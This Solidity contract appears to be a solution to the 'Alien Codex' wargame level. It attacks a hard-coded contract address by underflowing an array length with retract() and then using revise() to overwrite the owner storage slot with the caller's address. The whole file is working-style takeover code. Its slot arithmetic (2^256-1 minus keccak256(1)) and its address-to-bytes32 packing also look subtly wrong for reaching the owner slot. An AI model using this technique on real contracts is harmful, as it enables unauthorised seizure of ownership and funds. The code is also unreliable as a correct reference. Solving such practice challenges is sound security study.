// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IAlienCodex {
    function make_contact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract CodexCracker {

    address constant public alienCodexAddr = 0xBb6127b438B445B7cE725691EFeBaB367615fAA6;
    // bytes32 constant public newOwner = 0x00000000000000000000000000000000;
    bytes32 public newOwner;

    constructor() {
        newOwner = bytes32(abi.encodePacked(msg.sender));
    }

    function crackCodex() public {
        IAlienCodex(alienCodexAddr).make_contact(); // start off by making sure we've made contact
        IAlienCodex(alienCodexAddr).retract(); // Negative overflow length of the bytes array to make it take up all available slots

        // need to overwrite the owner variable in slot 0 starting from slot keccak256(1) or slot 2^256 - keccak(1)
        uint256 codex_start = uint256(keccak256(hex"0000000000000000000000000000000000000000000000000000000000000001"));
        // uint256 owner_slot = uint256(hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")-codex_start;
        uint256 owner_slot = 115792089237316195423570985008687907853269984665640564039457584007913129639935-codex_start;

        // call alien codex interface to revise the array slot with our address
        IAlienCodex(alienCodexAddr).revise(owner_slot, newOwner);
    }
}